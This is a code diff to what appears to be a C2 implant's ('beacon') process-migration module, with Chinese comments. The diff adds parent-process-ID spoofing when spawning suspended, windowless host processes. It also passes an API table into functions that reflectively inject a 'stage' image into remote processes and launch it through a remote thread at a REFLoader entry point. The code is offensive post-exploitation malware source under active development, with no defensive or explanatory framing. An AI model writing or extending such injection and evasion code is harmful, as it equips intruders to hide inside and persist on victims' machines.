@@ -1,5 +1,6 @@
 #include "beacon_migrate.h"
 #include "beacon_inject.h"
+#include "beacon_spawn.h"
 
 #define MIGRATE_START_WAIT_MS 1500u
 
@@ -92,7 +93,8 @@ static VOID MigrateFormatRemoteThreadStatus(HANDLE thread,
 }
 
 /* 准备 reflective stage：写入目标进程并解析 REFLoader 远程入口。 */
-static BOOL MigratePrepareRemoteReflective(HANDLE process,
+static BOOL MigratePrepareRemoteReflective(const Win32Api* api,
+                                           HANDLE process,
                                            const ByteBuf* stage,
                                            PVOID* remote_image,
                                            SIZE_T* remote_image_size,
@@ -108,7 +110,7 @@ static BOOL MigratePrepareRemoteReflective(HANDLE process,
     if (remote_entry) *remote_entry = NULL;
     if (err && err_size) err[0] = '\0';
 
-    if (!process || !stage || !stage->data || stage->len < sizeof(IMAGE_DOS_HEADER) ||
+    if (!api || !process || !stage || !stage->data || stage->len < sizeof(IMAGE_DOS_HEADER) ||
         !remote_image || !remote_entry) {
         if (err) strcpy_s(err, err_size, "invalid migrate remote reflective request");
         return FALSE;
@@ -118,6 +120,7 @@ static BOOL MigratePrepareRemoteReflective(HANDLE process,
     InjectResultInit(&result);
     req.method = INJECT_METHOD_REFLECTIVE;
     req.process = process;
+    req.api = api;
     req.image = stage;
     req.entry_export = "REFLoader";
     req.image_label = "stage";
@@ -132,13 +135,14 @@ static BOOL MigratePrepareRemoteReflective(HANDLE process,
 }
 
 /* 启动 migrate stage 的远程线程；Migrate 当前只做一次创建尝试。 */
-static BOOL MigrateCreateRemoteThreadChecked(HANDLE process,
+static BOOL MigrateCreateRemoteThreadChecked(const Win32Api* api,
+                                             HANDLE process,
                                              PVOID remote_entry,
                                              HANDLE* remote_thread,
                                              CHAR* err,
                                              SIZE_T err_size)
 {
-    return InjectCreateRemoteThread(process, remote_entry, NULL,
+    return InjectCreateRemoteThread(api, process, remote_entry, NULL,
                                     1, 0,
                                     "invalid migrate remote thread request",
                                     remote_thread, err, err_size);
@@ -187,8 +191,11 @@ static BOOL MigrateAssessStart(HANDLE process,
     return TRUE;
 }
 
-/* 创建挂起宿主进程，供 spawn-stage 在写入 stage 后再恢复主线程。 */
-static BOOL MigrateCreateSuspendedHost(const WCHAR* command_line,
+/* 创建挂起宿主进程，供 spawn-stage 在写入 stage 后再恢复主线程。
+ * PPID 欺骗策略由调用方传入 opt（请求携带 ppid 则覆盖，否则全局 spawn_ppid）。 */
+static BOOL MigrateCreateSuspendedHost(const Win32Api* api,
+                                       const SpawnOptions* opt,
+                                       const WCHAR* command_line,
                                        HANDLE* process,
                                        HANDLE* primary_thread,
                                        DWORD* pid,
@@ -207,12 +214,11 @@ static BOOL MigrateCreateSuspendedHost(const WCHAR* command_line,
     ZeroMemory(&pi, sizeof(pi));
     si.cb = sizeof(si);
 
-    if (!CreateProcessW(NULL, (LPWSTR)command_line, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
-                        NULL, NULL, &si, &pi)) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "migrate spawn CreateProcess failed: %lu",
-                             (ULONG)GetLastError());
+    if (!SpawnCreateProcess(api, opt,
+                            NULL, (LPWSTR)command_line, NULL, NULL, FALSE,
+                            CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                            NULL, NULL, &si, &pi,
+                            err, err_size)) {
         return FALSE;
     }
 
@@ -265,18 +271,26 @@ BOOL MigrateSpawnStage(const MigrateRequest* req,
         return FALSE;
     }
 
-    if (!MigrateCreateSuspendedHost(command_line_w,
-                                    &process, &primary_thread, &spawned_pid,
-                                    err, err_size)) {
-        HeapFree(GetProcessHeap(), 0, command_line_w);
-        return FALSE;
+    {
+        SpawnOptions spawn_opt;
+
+        ZeroMemory(&spawn_opt, sizeof(spawn_opt));
+        spawn_opt.ppid = req->ppid ? req->ppid : SpawnGetPpid();
+        spawn_opt.fallback_plain = TRUE;
+
+        if (!MigrateCreateSuspendedHost(req->api, &spawn_opt, command_line_w,
+                                        &process, &primary_thread, &spawned_pid,
+                                        err, err_size)) {
+            HeapFree(GetProcessHeap(), 0, command_line_w);
+            return FALSE;
+        }
     }
 
     /* 写入 stage 前先确认宿主架构，失败时保持进程仍可被安全终止。 */
     if (!MigrateValidateTargetMachine(process, stage_machine, err, err_size)) {
         goto cleanup;
     }
-    if (!MigratePrepareRemoteReflective(process, &req->stage,
+    if (!MigratePrepareRemoteReflective(req->api, process, &req->stage,
                                         &remote_image, &remote_image_size,
                                         &remote_entry, err, err_size)) {
         goto cleanup;
@@ -288,7 +302,7 @@ BOOL MigrateSpawnStage(const MigrateRequest* req,
     primary_thread = NULL;
     WaitForInputIdle(process, 1000);
 
-    if (!MigrateCreateRemoteThreadChecked(process, remote_entry,
+    if (!MigrateCreateRemoteThreadChecked(req->api, process, remote_entry,
                                           &remote_thread, err, err_size)) {
         goto cleanup;
     }
@@ -383,12 +397,12 @@ BOOL MigrateInjectStage(const MigrateRequest* req,
     if (!MigrateValidateTargetMachine(process, stage_machine, err, err_size)) {
         goto cleanup;
     }
-    if (!MigratePrepareRemoteReflective(process, &req->stage,
+    if (!MigratePrepareRemoteReflective(req->api, process, &req->stage,
                                         &remote_image, &remote_image_size,
                                         &remote_entry, err, err_size)) {
         goto cleanup;
     }
-    if (!MigrateCreateRemoteThreadChecked(process, remote_entry,
+    if (!MigrateCreateRemoteThreadChecked(req->api, process, remote_entry,
                                           &remote_thread, err, err_size)) {
         goto cleanup;
     }
